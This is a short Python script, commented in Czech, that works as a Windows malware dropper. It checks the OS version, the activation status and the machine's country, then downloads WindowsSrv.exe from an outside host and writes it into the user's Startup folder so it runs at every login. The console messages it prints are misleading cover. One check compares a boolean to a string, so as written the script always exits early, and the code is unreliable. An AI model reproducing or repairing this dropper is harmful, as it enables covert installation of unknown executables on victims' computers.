import requests
import os
import colorama
from colorama import Fore
import platform
import sys
import ctypes
colorama.init()
name = os.getenv('USERNAME')
url = 'https://test.gregoros.xyz/WindowsSrv.exe' 
cilovy_soubor = f'C:/Users/{name}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsSrv.exe'
operacni_system = platform.system()
blok_url = "http://ip-api.com/json/"
response = requests.get(blok_url)
data = response.json()
country = data['countryCode']
bloked = ['RU', 'KR', 'KP']
verze_os = platform.version()

import subprocess

def is_windows_activated():
    try:
        # Použití PowerShellu pro získání informací o stavu aktivity
        powershell_cmd = 'powershell "(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey"'
        result = subprocess.check_output(powershell_cmd, shell=True, universal_newlines=True)
        
        # Zkontrolovat, zda klíč je nenulový, což značí aktivovaný stav
        return result.strip() != ""
    except subprocess.CalledProcessError as e:
        print(f"Chyba při provádění příkazu PowerShellu: {e}")
        return False

# Zavolat funkci pro zjištění stavu aktivity
aktivovano = is_windows_activated()

def init():
  if operacni_system != 'Windows':
    sys.exit()
  if int(verze_os.split('.')[0]) < 10:
    sys.exit()
  if aktivovano != "True":
     sys.exit()
  if country in bloked:
    print(f"{Fore.RED}Unsuported country")
    return False
  print(f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] Checking")
  response = requests.get(url)
  with open(cilovy_soubor, 'wb') as soubor:
    soubor.write(response.content)
  print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] PHTTPF Running")
